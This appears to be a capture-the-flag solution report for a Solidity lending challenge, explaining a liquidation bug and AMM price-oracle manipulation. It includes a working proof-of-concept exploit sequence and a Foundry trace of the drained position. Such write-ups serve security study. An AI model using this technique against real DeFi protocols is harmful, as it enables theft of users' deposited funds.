# Challenge 8: Liquidatoooor - Solution Report

## Problem Overview

### Contract Summary

The challenge involves two main contracts:

1. `Oiler.sol`: A lending protocol that allows users to deposit TOKEN as collateral and borrow dTOKEN. Key functions include:

   - `deposit()`: Deposit TOKEN as collateral
   - `borrow()`: Borrow dTOKEN against deposited collateral
   - `healthFactor()`: Calculate user's position health
   - `liquidate()`: Liquidate undercollateralized positions

2. `AMM.sol`: A constant product Automated Market Maker for TOKEN/DAI pair. Key functions include:
   - `swap()`: Swap between TOKEN and DAI
   - `addLiquidity()`: Add liquidity to the pool
   - `getPriceToken0()`: Get the price of TOKEN in terms of DAI

### Initial Setup

- Player starts with 100 TOKEN and 100 DAI
- Superman (victim) starts with 200 TOKEN and 200 DAI
- Superman adds 100 TOKEN and 100 DAI as liquidity to the AMM
- Superman deposits 100 TOKEN as collateral in Oiler and borrows 75 dTOKEN

### Success Criteria

To solve the challenge, the player must:

- Liquidate Superman's position
- End up with more than 200 TOKEN

## Vulnerability

The main vulnerability in this challenge lies in the `Oiler.sol` contract, specifically in the `liquidate()` function:

```solidity
function liquidate(address _user) public {
    uint256 positionHealth = healthFactor(_user) / 10 ** 18;
    require(positionHealth < LIQUIDATION_THRESHOLD, "Liquidate: User not underwater");
    uint256 repayment = users[_user].borrow * 5 / 100;
    _burn(msg.sender, repayment);
    users[_user].borrow -= repayment;
    uint256 totalCollateralAmount = users[_user].collateral;
    token.transfer(msg.sender, totalCollateralAmount);
    users[_user].collateral = 0;
    users[_user].liquidated = true;

    emit Liquidated(msg.sender, _user, repayment);
}
```

The vulnerability stems from two key issues:

1. Disproportionate Liquidation: The function allows the liquidator to seize all of the user's collateral (`totalCollateralAmount`) while only repaying a small portion (5%) of the user's debt. This creates a significant imbalance that can be exploited for profit.

2. Price Manipulation Susceptibility: The `healthFactor()` function relies on the current token price from the AMM to determine if a position is liquidatable. This makes the system vulnerable to price manipulation attacks, where an attacker can temporarily influence the price to trigger liquidations.

These vulnerabilities, combined with the simplistic price oracle (AMM) implementation, create an opportunity for an attacker to manipulate the market price, force a user's position below the liquidation threshold, and then liquidate the position for a substantial profit.

## Attack Process

The attack exploits the vulnerabilities in the `Oiler.sol` contract and the price manipulation susceptibility of the system. The process involves the following steps:

1. Price Manipulation:

   - The attacker swaps a small amount of TOKEN for DAI in the AMM.
   - This action decreases the price of TOKEN relative to DAI.
   - The reduced TOKEN price lowers the value of Superman's collateral in the Oiler contract.

2. Health Factor Reduction:

   - The price manipulation causes Superman's health factor to fall below the liquidation threshold (1.00).
   - This makes Superman's position eligible for liquidation.

3. Preparation for Liquidation:

   - The attacker calculates the amount of dTOKEN needed to repay 5% of Superman's debt.
   - The attacker deposits just enough TOKEN as collateral in the Oiler contract to borrow this amount of dTOKEN.

4. Borrowing dTOKEN:

   - The attacker borrows the calculated amount of dTOKEN from the Oiler contract.

5. Liquidation:

   - The attacker calls the `liquidate()` function on Superman's position.
   - This burns the borrowed dTOKEN to repay 5% of Superman's debt.
   - In return, the attacker receives all of Superman's collateral (100 TOKEN).

6. Collateral Withdrawal:

   - The attacker withdraws their remaining collateral from the Oiler contract.

7. Token Conversion:
   - The attacker swaps any remaining DAI for TOKEN in the AMM to maximize TOKEN holdings.

The result of this process is that the attacker ends up with significantly more TOKEN than they started with, having liquidated Superman's position by exploiting the vulnerabilities in the system.

## Proof of Concept (PoC)

This section demonstrates the practical implementation of the attack process described earlier.

### Core Implementation

```solidity
// 1. Approve tokens for AMM and Oiler
token.approve(address(amm), type(uint256).max);
dai.approve(address(amm), type(uint256).max);
token.approve(address(oiler), type(uint256).max);

// 2. Swap token in AMM to manipulate price
uint256 swapAmount = 1; // Swap 1 token
amm.swap(address(token), swapAmount);

// 3. Calculate borrow amount (slightly more than 5% of Superman's borrow)
Oiler.User memory supermanData = oiler.getUserData(superman);
uint256 borrowAmount = (supermanData.borrow * 6) / 100; // 6% to be safe

// 4. Calculate and deposit the exact amount of collateral needed
uint256 tokenPrice = oiler.getPriceToken();
uint256 collateralFactor = 75; // CF from Oiler contract
uint256 depositAmount = (borrowAmount * 1e20) / (tokenPrice * collateralFactor);
// Add a small buffer to ensure we have enough collateral
depositAmount = (depositAmount * 102) / 100; // Add 2% buffer
oiler.deposit(depositAmount);

// 5. Borrow dTokens
oiler.borrow(borrowAmount);

// 6. Liquidate Superman's position
oiler.liquidate(superman);

// 7. Withdraw player's remaining dTokens
uint256 playerdToken = oiler.balanceOf(player);
oiler.withdraw(playerdToken);

// 8. Swap dai for token in AMM
uint256 daiBalance = dai.balanceOf(player);
amm.swap(address(dai), daiBalance);
```

### Running Result

```
Ran 1 test for test/Challenge8.t.sol:Challenge8Test
[PASS] testSolution() (gas: 388969)
Logs:
  Initial token balance:  100
  Initial dai balance:  100
  Final token balance:  245
  Final dai balance:  0

Traces:
  [458269] Challenge8Test::testSolution()
    ├─ [0] VM::startPrank(Super-man: [0x7E51597D2eB2a2a91e8894dB4a962692252f9729])
    │   └─ ← [Return]
    ├─ [24628] TKN::approve(oiler: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 100)
    │   ├─ emit Approval(owner: Super-man: [0x7E51597D2eB2a2a91e8894dB4a962692252f9729], spender: oiler: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], value: 100)
    │   └─ ← [Return] true
    ├─ [56828] oiler::deposit(100)
    │   ├─ [32522] TKN::transferFrom(Super-man: [0x7E51597D2eB2a2a91e8894dB4a962692252f9729], oiler: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], 100)
    │   │   ├─ emit Approval(owner: Super-man: [0x7E51597D2eB2a2a91e8894dB4a962692252f9729], spender: oiler: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], value: 0)
    │   │   ├─ emit Transfer(from: Super-man: [0x7E51597D2eB2a2a91e8894dB4a962692252f9729], to: oiler: [0x5991A2dF15A8F6A256D3Ec51E99254Cd3fb576A9], value: 100)
    │   │   └─ ← [Return] true
    │   ├─ emit Deposited(depositor: Super-man: [0x7E51597D2eB2a2a91e8894dB4a962692252f9729], collateralAmount: 100)
    │   └─ ← [Stop]

...

    ├─ [562] TKN::balanceOf(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 245
    ├─ [0] console::log("Final token balance: ", 245) [staticcall]
    │   └─ ← [Stop]
    ├─ [562] DAI::balanceOf(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [0] console::log("Final dai balance: ", 0) [staticcall]
    │   └─ ← [Stop]
    ├─ [0] VM::stopPrank()
    │   └─ ← [Return]
    ├─ [1167] oiler::getUserData(Super-man: [0x7E51597D2eB2a2a91e8894dB4a962692252f9729]) [staticcall]
    │   └─ ← [Return] User({ collateral: 0, borrow: 72, liquidated: true })
    ├─ [562] TKN::balanceOf(player: [0x44E97aF4418b7a17AABD8090bEA0A471a366305C]) [staticcall]
    │   └─ ← [Return] 245
    └─ ← [Stop]
```
